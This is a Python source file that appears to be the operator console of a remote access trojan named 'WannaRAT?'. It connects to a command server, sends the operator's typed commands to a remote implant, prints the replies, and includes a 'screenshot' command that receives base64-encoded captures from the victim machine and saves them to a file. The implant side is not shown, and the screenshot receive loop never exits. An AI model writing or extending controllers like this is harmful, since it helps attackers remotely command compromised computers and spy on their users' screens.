import ctypes
import getpass
import os
import socket
import time
import base64
import art

from colorama import Fore

PORT = 55555
IP = "localhost"
FULLADDRESS = (IP, PORT)

ENCODING = 'utf-8'
HEADER = 99999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(FULLADDRESS)

client.send(f"{getpass.getuser()}@adminconsole".encode(ENCODING))

print(Fore.RED,art.text2art('WannaRAT?'))

def recvall(client):
    BUFF_SIZE = 4096 # 4 KiB
    data = b''
    while True:
        part = client.recv(BUFF_SIZE)
        data += part
        if len(part) < BUFF_SIZE:
            # either 0 or end of data
            break
    return data


while True:
    command = input(Fore.LIGHTWHITE_EX + "\n>> " + Fore.GREEN)
    client.send(command.encode(ENCODING))
    if command == "screenshot":
        time.sleep(5)
        with open('ss.png', 'wb') as file:
            while True:
                if not (data := recvall(client)):
                    continue
                print(data)
                file.write(base64.b64decode(data + b'=='))
                continue
    print(client.recv(HEADER).decode(ENCODING))



